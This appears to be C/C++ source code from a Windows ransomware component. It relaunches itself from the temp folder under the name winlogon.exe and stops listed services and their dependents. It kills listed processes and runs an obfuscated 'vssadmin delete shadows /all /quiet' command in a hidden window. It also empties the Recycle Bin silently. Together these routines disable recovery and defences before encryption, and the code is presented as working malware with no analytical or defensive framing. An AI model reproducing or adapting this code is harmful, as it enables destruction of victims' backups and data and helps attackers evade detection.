#include "include.h"
#include "Sys.h"
#include "config.h"
#include "xorstr.hpp"
#include "utils.h"

typedef PVOID(WINAPI* PShellExecuteW)(HWND, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, INT);


BOOL MoveProcessToTempFolder()
{
    BOOL res = TRUE;

    TCHAR filePath[MAX_PATH];
    TCHAR tempPath[MAX_PATH];
    GetModuleFileNameW(NULL, filePath, MAX_PATH);
    GetTempPathW(MAX_PATH, tempPath);

    if (StrStrW(filePath, L"winlogon.exe") == 0) {

        StrCatW(tempPath, L"\\winlogon.exe");

        if (MoveFileExW(filePath, tempPath, 1) != 0)
        {
            Sleep(2000);

            HMODULE hModuleShell32 = LoadLibraryA("Shell32.dll");
            PShellExecuteW funcPShellExecuteW = (PShellExecuteW)GetProcAddress(hModuleShell32, "ShellExecuteW");

            funcPShellExecuteW(NULL, L"open", tempPath, NULL, NULL, SW_SHOW);
            exit(8);
        }
        else
        {
            res = FALSE;
        }

    }

    return res;
}
VOID IsProcessRunning()
{

    HANDLE ghMutex = CreateMutexA(0, FALSE, "Local\\IHKEY");

    if (ghMutex == NULL)
    {
        printf("CreateMutex error: %d\n", GetLastError());

    }

    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        exit(1);
    }

    CloseHandle(ghMutex);
}

VOID __stdcall StopDependentServices(SC_HANDLE schService , SC_HANDLE schSCManager)
{
    DWORD i;
    DWORD dwBytesNeeded;
    DWORD dwCount;

    LPENUM_SERVICE_STATUS   lpDependencies = NULL;
    ENUM_SERVICE_STATUS     ess;
    SC_HANDLE               hDepService;
    SERVICE_STATUS_PROCESS  ssp;

    DWORD dwStartTime = GetTickCount();
    DWORD dwTimeout = 30000; // 30-second time-out


    if (EnumDependentServices(schService, SERVICE_ACTIVE,
        lpDependencies, 0, &dwBytesNeeded, &dwCount))
    {
        return;
    }
    else
    {
        if (GetLastError() != ERROR_MORE_DATA)
        {
            return;
        }

        lpDependencies = (LPENUM_SERVICE_STATUS)HeapAlloc(
            GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytesNeeded);

        if (lpDependencies == NULL)
        {
            return;
        }

        _try
        {

            if (!EnumDependentServices(schService, SERVICE_ACTIVE,lpDependencies,
            dwBytesNeeded, &dwBytesNeeded,
                &dwCount))
            {
                return;
            }
            
            for (i = 0; i < dwCount; i++)
            {
                ess = *(lpDependencies + i);

                hDepService = OpenService(schSCManager,
                    ess.lpServiceName,
                    SERVICE_STOP | SERVICE_QUERY_STATUS);

                if (!hDepService)
                    return;

                _try
                {
                    if (!ControlService(hDepService,SERVICE_CONTROL_STOP,(LPSERVICE_STATUS)&ssp))
                    {
                        return;
                    }

                    while(ssp.dwCurrentState != SERVICE_STOPPED)
                    {
                        Sleep(ssp.dwWaitHint);

                        if (!QueryServiceStatusEx(hDepService,SC_STATUS_PROCESS_INFO,(LPBYTE)&ssp,sizeof(SERVICE_STATUS_PROCESS),
                            &dwBytesNeeded))
                            return;

                        if (ssp.dwCurrentState == SERVICE_STOPPED)
                        {
                            break;
                        }

                        if (GetTickCount() - dwStartTime > dwTimeout)
                        {
                            return;
                        }
                    }

                }
                __finally
                {
                    CloseServiceHandle(hDepService);
                }
            }

        }

          __finally
        {
            HeapFree(GetProcessHeap(), 0, lpDependencies);
        }
    }
   
}

VOID ServiceKiller()
{
    SERVICE_STATUS_PROCESS ssp;
    DWORD dwStartTime = GetTickCount();
    DWORD dwBytesNeeded;
    DWORD dwTimeout = 30000; // 30-second time-out
    DWORD dwWaitTime;
    SC_HANDLE schSCManager , schService;

   schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

   if (schSCManager == NULL)
   {
       return;
   }

   for (size_t i = 0; i < ARRAYSIZE(services); i++)
   {
       schService = OpenServiceA(
           schSCManager, services[i], SERVICE_STOP |SERVICE_QUERY_STATUS |SERVICE_ENUMERATE_DEPENDENTS);

       if (schService != NULL)
       {
           if (QueryServiceStatusEx(schService , SC_STATUS_PROCESS_INFO , (LPBYTE)&ssp , 
               sizeof(SERVICE_STATUS_PROCESS) , &dwBytesNeeded))
           {

               if (ssp.dwCurrentState == SERVICE_STOPPED)
               {
                   goto stop_cleanup;
               }

               while (ssp.dwCurrentState == SERVICE_STOP_PENDING)
               {
                    dwWaitTime = ssp.dwWaitHint / 10;

                    if (dwWaitTime < 1000)
                    {
                        dwWaitTime = 1000;
                    }
                    else if (dwWaitTime > 15000)
                    {
                        dwWaitTime = 12000;
                    }
                    else
                    {
                        dwWaitTime = 10000;
                    }

                    std::this_thread::sleep_for(std::chrono::milliseconds(dwWaitTime));

                    if (QueryServiceStatusEx(schService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS),
                        &dwBytesNeeded))
                    {
                        if (ssp.dwCurrentState == SERVICE_STOPPED)
                        {
                            goto stop_cleanup;
                        }

                        else if (GetTickCount() - dwStartTime > dwTimeout)
                        {
                            goto stop_cleanup;
                        }
                    }
                    else
                    {
                        goto stop_cleanup;
                    }

               }

               StopDependentServices(schService , schSCManager);

               if (!ControlService(schService,SERVICE_CONTROL_STOP,(LPSERVICE_STATUS)&ssp))
               {
                  
                   goto stop_cleanup;
               }


               while (ssp.dwCurrentState != SERVICE_STOPPED)
               {
                   std::this_thread::sleep_for(std::chrono::milliseconds(dwWaitTime));

                   if (!QueryServiceStatusEx( schService, SC_STATUS_PROCESS_INFO,(LPBYTE)&ssp,sizeof(SERVICE_STATUS_PROCESS),
                       &dwBytesNeeded))
                   {
                       printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
                       goto stop_cleanup;
                   }

                   if (ssp.dwCurrentState == SERVICE_STOPPED)
                       break;

                   if (GetTickCount() - dwStartTime > dwTimeout)
                   {
                       printf("Wait timed out\n");
                       goto stop_cleanup;
                   }
               }
               printf("Service stopped successfully\n");
               }

       stop_cleanup:
           CloseServiceHandle(schService);
           CloseServiceHandle(schSCManager);

           }
       }
   }



VOID ProcessKiller()
{
    PROCESSENTRY32W pEntry;
    DWORD i;
    HANDLE hSnapShot;
    HANDLE hProcess;

    pEntry.dwSize = sizeof(pEntry);

    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapShot == INVALID_HANDLE_VALUE)
    {
        return;
    }

    if (!Process32First(hSnapShot, &pEntry))
    {
       
        CloseHandle(hSnapShot);          // clean the snapshot object
        return;
    }

    do
    {
        for (i = 0; i < ARRAYSIZE(processes); i++)
        {
            if (lstrcmpW(_wcslwr((WCHAR *)processes[i]), _wcslwr(pEntry.szExeFile)) == 0)
            {
                hProcess = OpenProcess(PROCESS_TERMINATE, 0, (DWORD)pEntry.th32ProcessID);
                if (hProcess != NULL)
                {
                    TerminateProcess(hProcess, 0x14);
                    CloseHandle(hProcess);
                }
                else
                {
                    break;
                }
               
            }
        }

    }while (Process32NextW(hSnapShot, &pEntry));

    CloseHandle(hSnapShot);
}

BOOL myIsWow64Process()
{
    BOOL bIsWow = 0;

    HMODULE hModule = GetModuleHandleA("kernel32.dll");
    pdef_IsWow64Process IsWow64Process_ = (pdef_IsWow64Process)GetProcAddress(hModule, "IsWow64Process");
    if (IsWow64Process_ != NULL)
    {
        if (!IsWow64Process_(GetCurrentProcess(), &bIsWow))
        {
            bIsWow = FALSE;
        }
    }
    return bIsWow;
}






VOID ShadowDeleter()
{
    PVOID oldValue = NULL;
    if (myIsWow64Process())
    {
        HMODULE hModule = LoadLibraryA("kernel32.dll");
        pdef_Wow64DisableWow64FsRedirection Wow64DisableWow64FsRedirection_ = (pdef_Wow64DisableWow64FsRedirection)GetProcAddress(hModule, "Wow64DisableWow64FsRedirection");

        if (Wow64DisableWow64FsRedirection_ != NULL)
        {
            Wow64DisableWow64FsRedirection_(&oldValue);
        }
    }

    HMODULE hModuleShell32 = LoadLibraryA("Shell32.dll");
    PShellExecuteW funcPShellExecuteW = (PShellExecuteW)GetProcAddress(hModuleShell32, "ShellExecuteW");

    if (funcPShellExecuteW != NULL)
    {
        funcPShellExecuteW(NULL, xorstr_(L"open"), xorstr_(L"cmd.exe"), xorstr_(L"/c vssadmin.exe delete shadows /all /quiet"), 0, SW_HIDE);
    }


    
    if (myIsWow64Process())
    {
        HMODULE hModule2 = LoadLibraryA("kernel32.dll");
        pdef_Wow64RevertWow64FsRedirection Wow64RevertWow64FsRedirection_ = (pdef_Wow64RevertWow64FsRedirection)GetProcAddress(hModule2, "Wow64RevertWow64FsRedirection");
        if (Wow64RevertWow64FsRedirection_ != NULL)
        {
            Wow64RevertWow64FsRedirection_(&oldValue);
        }
    }
}


VOID EmptyRecycleBin()
{
	SHEmptyRecycleBinA(0, 0, SHERB_NOCONFIRMATION | SHERB_NOPROGRESSUI | SHERB_NOSOUND);
}